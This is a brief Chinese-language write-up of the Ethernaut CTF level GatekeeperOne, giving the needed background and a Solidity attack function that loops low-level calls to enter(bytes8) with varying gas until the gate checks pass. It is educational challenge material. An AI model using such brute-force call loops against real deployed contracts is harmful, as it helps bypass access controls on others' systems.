# 13_GatekeeperOne Project

### 一、挑戰攻破 Ethernaut CTF 第 13 題： GatekeeperOne

- 勝利條件：通過 GatekeeperOne
- 知識儲備：修飾器、gasleft()、import hardhat/console.log、精算 gas limit、合約迴圈

### 二、解題思路：

1. 將 GatekeeperOne 拆分成 part1, part2, part3，再搭配 hardhat/console.log 精算氣與鑰匙
2. 即便是在已部屬在測試網的合約，無法使用 hardhat/console.log，仍可以添加公開變數，再腳本用 getter 函數去調查除錯

### 三、Solidity：

```solidity
function attack(uint64 gasToUse) public {
    // Call the enter function of GatekeeperOne with the gateKey
    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 500; i++){
        (result, ) = gatekeeperOneAddress.call{gas: gasToUse + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (result) {
            // 神秘數字是256
            gasOffset = i;
            result = true;
            break;
        } else {
            looptime += 1;
            continue;
        }
    }
    // require(success, "Attack failed");
}    
```

1. gatekeeperOneAddress.call 在失敗的時候，不會自動回滾交易。程序仍會繼續執行